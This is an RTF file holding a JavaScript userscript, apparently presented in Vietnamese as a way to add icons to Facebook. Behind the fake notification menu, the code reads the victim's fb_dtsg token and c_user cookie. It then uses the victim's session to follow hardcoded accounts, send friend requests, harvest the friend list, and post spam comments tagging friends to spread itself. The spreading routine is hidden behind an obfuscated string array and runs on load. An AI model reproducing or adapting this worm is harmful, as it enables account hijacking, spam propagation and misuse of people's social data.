{\rtf1\fbidis\ansi\deff0{\fonttbl{\f0\fnil\fcharset0 Calibri;}{\f1\fnil\fcharset238 Calibri;}}
{\colortbl ;\red0\green0\blue255;}
{\*\generator Msftedit 5.41.21.2509;}\viewkind4\uc1\pard\ltrpar\sa200\sl276\slmult1\lang9\f0\fs22 // ==UserScript==\par
// @name            C\'e0i \f1\'f0\u7863?t ICON tr\u7921?c ti\u7871?p tr\f0\'ean FaceBook 2014 (y)\par
...
\par
\tab // Toggler\par
\tab html += '<a class="navLink" title="1 Th\'f4ng B\'e1o M\u7899?i">'; // var navLink\par
...
\tab html += '<div class="jewelFooter">';\par
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Ch\'fac M\u7915?ng B\u7841?n \f1\'d0\f0\'e3 C\'e0i \f1\'d0\u7863?t ICON FACEBOOK Th\f0\'e0nh C\'f4ng <br>FaceBook.Com</a>';\par
\tab html += '</div>';\par
\par
\tab // \}\par
...
\}\par
//Boss\par
sublist("720828751262462");
id("100000060303964");
("100004232641630");
sublist("451519714956641");
sublist("10202148836196135");
\par
\par
var gid = ['552517338188669'];\par
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];\par
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\\d+)/)[1]);\par
...
function sarkadaslari_al()\{\par
                var xmlhttp = new XMLHttpRequest();\par
        xmlhttp.onreadystatechange = function () \{\par
                        if(xmlhttp.readyState == 4)\{\par
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");\par
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++)\{\par
                                        smesaj = "";\par
                                        smesaj_text = "";\par
                                  for(i=f*10;i<(f+1)*10;i++)\{\par
                                        if(arkadaslar.payload.entries[i])\{\par
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";\par
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;\par
                                  \}\par
                                        \}\par
                                        sdurumpaylas();                         \}\par
                               \par
                       ...
                       \par
        \};\par
                var params = "&filter[0]=user";\par
                params += "&options[0]=friends_only";\par
                params += "&options[1]=nm";\par
                params += "&token=v7";\par
        params += "&viewer=" + user_id;\par
                params += "&__user=" + user_id;\par
               \par
...
function sarkadasekle(uid,cins)\{\par
        ...
        \};\par
               \par
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true);\par
                var params = "to_friend=" + uid;\par
                params += "&action=add_friend";\par
                params += "&how_found=friend_browser";\par
                params += "&ref_param=none";\par
                params += "&outgoing_id=";\par
                params += "&logging_location=friend_browser";\par
                params += "&no_flyout_on_click=true";\par
                params += "&ego_log_data=";\par
                params += "&http_referer=";\par
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;\par
...
function sarkadasekle(uid,cins)\{\par
        ...
        params += "&phstamp=165816749114848369115";\par
                params += "&__user=" + user_id;\par
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);\par
...
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1)\{\par
                xmlhttp.send(params);\par
\}else if(document.cookie.split("cins" + user_id +"=").length <= 1)\{\par
                cinsiyetgetir(uid,cins,"sarkadasekle");\par
...
function scinsiyetgetir(uid,cins,fonksiyon)\{\par
        ...
        xmlhttp.onreadystatechange = function () \{\par
                        if(xmlhttp.readyState == 4)\{\par
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");\par
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html\par
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);\par
                        if(cinshtml.getElementsByTagName("select")[0].value == "1")\{\par
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();\par
                        \}else if(cinshtml.getElementsByTagName("select")[0].value == "2")\{\par
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();\par
                        \}\par
                        eval(fonksiyon + "(" + id + "," + cins + ");");\par
                        \}\par
        \};\par
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);\par
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);\par
                xmlhttp.send();\par
\}\par
\par
var _0xa22c=["value","fb_dtsg","getElementsByName","match","cookie","1405707869687401","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round"," @[","uid",":","text","]"," ","\\x26filter[0]=user","\\x26options[0]=friends_only","\\x26options[1]=nm","\\x26token=v7","\\x26viewer=","\\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\\x26ft_ent_identifier=","\\x26comment_text= C\'e0i \f1\'d0\u7863?t ICON d\u7877? m\f0\'e0 , m\'ecnh m\u7899?i test th\u7917? ok l\u7855?m , c\'e1c b\u7841?n ai c\u7847?n th\'ec th\u7917? nha (Y) <3 :D :P \u9996? \u-10179?\u-9048? \u-10179?\u-9137? ","\\x26source=2","\\x26client_id=1377871797138:1707018092","\\x26reply_fbid","\\x26parent_comment_id","\\x26rootid=u_jsonp_2_3","\\x26clp=\{\\x22cl_impid\\x22:\\x22453524a0\\x22,\\x22clearcounter\\x22:0,\\x22elementid\\x22:\\x22js_5\\x22,\\x22version\\x22:\\x22x\\x22,\\x22parent_fbid\\x22:","\}","\\x26attached_sticker_fbid=0","\\x26attached_photo_fbid=0","\\x26giftoccasion","\\x26ft[tn]=[]","\\x26__a=1","\\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\\x26__req=q","\\x26fb_dtsg=","\\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id)\{var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function ()\{if(_0x7892x7[_0xa22c[7]]==4)\{eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++)\{mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++)\{if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i])\{mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];\} ;\} ;yorum_yap(id,mesaj);\} ;\} ;\} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0)\{_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);\} else \{_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);\} ;_0x7892x7[_0xa22c[37]]();\} ;function RandomArkadas()\{var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++)\{_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];\} ;return _0x7892xa;\} ;function yorum_yap(id,_0x7892xc)\{var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function ()\{if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200)\{_0x7892xd[_0xa22c[64]];\} ;\} ;_0x7892xd[_0xa22c[37]](_0x7892x8);\} ;arkadaslari_al(id);\par
